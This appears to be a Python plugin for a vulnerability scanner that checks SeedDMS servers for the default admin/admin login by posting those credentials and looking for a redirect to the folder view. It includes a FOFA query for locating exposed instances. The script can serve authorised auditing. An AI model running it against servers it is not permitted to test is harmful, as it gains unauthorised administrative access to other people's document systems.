#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'SeedDMS默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="SeedDMS:-Sign-in"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'Origin': url,
      'Referer': f'{url}/out/out.Login.php?referuri=%2Fout%2Fout.ViewFolder.php',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/op/op.Login.php'
  data = 'referuri=%2Fout%2Fout.ViewFolder.php&login=admin&pwd=admin&lang='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False,allow_redirects=False)
    # print(res.headers)
    # print(res.status_code)
    # print(res.text)
    if res.status_code == 302 and '/out/out.ViewFolder.php' in res.headers['location']:
      ret['huixian'] = data
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret